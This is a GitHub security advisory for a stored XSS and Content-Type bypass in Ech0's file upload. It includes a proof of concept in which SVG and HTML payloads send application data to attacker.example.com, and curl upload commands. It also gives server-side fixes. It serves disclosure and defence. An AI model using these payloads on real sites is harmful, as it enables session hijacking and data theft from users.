# [M] Ech0 has Stored XSS via SVG Upload and Content-Type Validation Bypass in File Upload

## Summary
Severity: Medium
Advisory: GHSA-69hx-63pv-f8f4
CWE: CWE-434
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-69hx-63pv-f8f4
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/ech0` — affected >=0 <4.4.3

## Details
## Summary

The file upload endpoint validates Content-Type using only the client-supplied multipart header, with no server-side content inspection or file extension validation. Combined with an unauthenticated static file server that determines Content-Type from file extension, this allows an admin to upload HTML/SVG files containing JavaScript that execute in the application's origin when visited by any user. Additionally, `image/svg+xml` is in the default allowed types, enabling stored XSS via SVG without any Content-Type spoofing.

## Details

The upload handler at `internal/service/file/file.go:85-87` validates file type using only the multipart `Content-Type` header:

```go
contentType := file.Header.Get("Content-Type") // client-controlled
if !isAllowedType(contentType, config.Config().Upload.AllowedTypes) {
    return commonModel.FileDto{}, errors.New(commonModel.FILE_TYPE_NOT_ALLOWED)
}
```

`isAllowedType` at `file.go:836-843` performs exact string matching — no magic byte detection, no extension validation:

```go
func isAllowedType(contentType string, allowedTypes []string) bool {
    for _, allowed := range allowedTypes {
        if contentType == allowed {
            return true
        }
    }
    return false
}
```

The original file extension is preserved in the storage key by `RandomKeyGenerator` at `internal/storage/keygen.go:41`:

```go
ext := strings.ToLower(filepath.Ext(strings.TrimSpace(originalFilename)))
```

All locally stored files are served publicly without authentication at `internal/router/modules.go:51`:

```go
ctx.Engine.Static("api/files", root)
```

This `gin.Static` call is registered directly on the engine, outside any authentication middleware group. Go's `http.ServeFile` (used internally by `gin.Static`) determines the response `Content-Type` using `mime.TypeByExtension`, so `.html` files are served as `text/html` and `.svg` files as `image/svg+xml`.

No `X-Content-Type-Options: nosniff` or `Content-Security-Policy` headers are set (verified in `internal/router/middleware.go`).

**Variant 1 — SVG XSS (no spoofing needed):** `image/svg+xml` is in the default `AllowedTypes` at `internal/config/config.go:241`. SVG files can contain `<script>` tags and event handlers. The VireFS schema routes `.svg` to `images/` (`internal/storage/schema.go:10`). Uploaded SVGs are publicly accessible at `/api/files/images/<key>.svg` and JavaScript within them executes in the application's origin.

**Variant 2 — Content-Type spoofing:** Upload an `.html` file with a forged multipart `Content-Type: image/jpeg`. The allowlist check passes (image/jpeg is allowed). The `.html` extension is preserved. The VireFS schema routes unknown extensions to `files/` (`schema.go:14`). The file is served at `/api/files/files/<key>.html` as `text/html`.

## PoC

**Variant 1 — SVG XSS (simplest, default config):**

```bash
# 1. Create SVG with embedded JavaScript
cat > evil.svg << 'SVGEOF'
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <script>
    // Steal cookies and redirect to attacker
    fetch('/api/echo/page')
      .then(r => r.json())
      .then(d => {
        new Image().src = 'https://attacker.example.com/collect?data=' + btoa(JSON.stringify(d));
      });
  </script>
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>
SVGEOF

# 2. Upload as admin (image/svg+xml is default-allowed, no spoofing needed)
curl -X POST http://target:1024/api/files/upload \
  -H 'Authorization: Bearer <admin-jwt>' \
  -F 'file=@evil.svg;type=image/svg+xml' \
  -F 'category=image' \
  -F 'storage_type=local'

# Response includes the storage key, e.g.: images/<uid>_<ts>_<rand>.svg
# 3. Access without authentication — JavaScript executes in application origin:
# GET http://target:1024/api/files/images/<uid>_<ts>_<rand>.svg
```

**Variant 2 — Content-Type bypass with HTML:**

```bash
# 1. Create HTML with JavaScript
cat > evil.html << 'HTMLEOF'
<html><body>
<script>
  document.write('<h1>XSS in ' + document.domain + '</h1>');
  // Exfiltrate data from same-origin API
  fetch('/api/echo/page').then(r=>r.json()).then(d=>{
    new Image().src='https://attacker.example.com/?d='+btoa(JSON.stringify(d));
  });
</script>
</body></html>
HTMLEOF

# 2. Upload with spoofed Content-Type
curl -X POST http://target:1024/api/files/upload \
  -H 'Authorization: Bearer <admin-jwt>' \
  -F 'file=@evil.html;type=image/jpeg' \
  -F 'category=image' \
  -F 'storage_type=local'

# 3. Access without authentication — renders as text/html:
# GET http://target:1024/api/files/files/<uid>_<ts>_<rand>.html
```

## Impact

- **Stored XSS in the application origin**: JavaScript executes in the context of the Ech0 application domain when any user visits the file URL directly.
- **Session hijacking**: Attacker script can access same-origin cookies and API endpoints, enabling theft of admin session tokens.
- **Persistent backdoor**: The malicious file remains on the unauthenticated static server even after the compromised admin account is secured or its credentials are rotated.
- **Data exfiltration**: JavaScript running in the application origin can call internal API endpoints (e.g., `/api/echo/page`) and exfiltrate application data.
- **Social engineering vector**: An admin (or attacker with admin credentials) plants the file; any user tricked into clicking the link is compromised.

The admin-required upload limits initial access, but the persistent nature of the stored XSS and the unauthenticated static serving create a meaningful attack surface, particularly in multi-admin deployments or after admin account compromise.

## Recommended Fix

**1. Validate Content-Type server-side using magic bytes** (`internal/service/file/file.go`):

```go
import "net/http"

// Replace client-controlled Content-Type with server-detected type
func detectContentType(file multipart.File) (string, error) {
    buf := make([]byte, 512)
    n, err := file.Read(buf)
    if err != nil && err != io.EOF {
        return "", err
    }
    if _, err := file.Seek(0, io.SeekStart); err != nil {
        return "", err
    }
    return http.DetectContentType(buf[:n]), nil
}
```

**2. Remove `image/svg+xml` from default AllowedTypes** or sanitize SVGs to strip `<script>` tags and event handlers before storage.

**3. Add security headers** in `internal/router/middleware.go`:

```go
func SecurityHeaders() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("X-Content-Type-Options", "nosniff")
        c.Header("Content-Security-Policy", "default-src 'self'; script-src 'self'")
        c.Next()
    }
}
```

**4. Serve uploaded files with `Content-Disposition: attachment`** or from a separate origin/subdomain to isolate them from the application's cookie scope.

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-69hx-63pv-f8f4
- https://github.com/lin-snow/Ech0
- https://github.com/lin-snow/Ech0/releases/tag/v4.4.3
